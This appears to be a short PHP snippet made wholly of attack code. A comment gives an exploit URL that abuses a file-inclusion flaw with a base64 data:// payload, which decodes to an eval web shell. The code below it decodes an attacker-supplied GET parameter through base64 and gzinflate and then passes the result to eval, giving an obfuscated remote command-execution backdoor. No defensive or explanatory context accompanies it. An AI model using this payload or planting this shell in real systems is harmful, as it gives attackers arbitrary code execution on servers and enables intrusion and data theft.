<?php
// Exploit URL: http://target.com/vulnerable.php?include=data://text/plain;base64,PD9waHAKZXZhbCgkX1BPU1RbJ2NtZCddKTs%2F
// Decoded payload: <?php eval($_POST['cmd']); ?>
// Multi-layer obfuscation:
$enc = base64_decode($_GET['cmd']);
$dec = gzinflate(base64_decode($enc));
eval($dec);
?>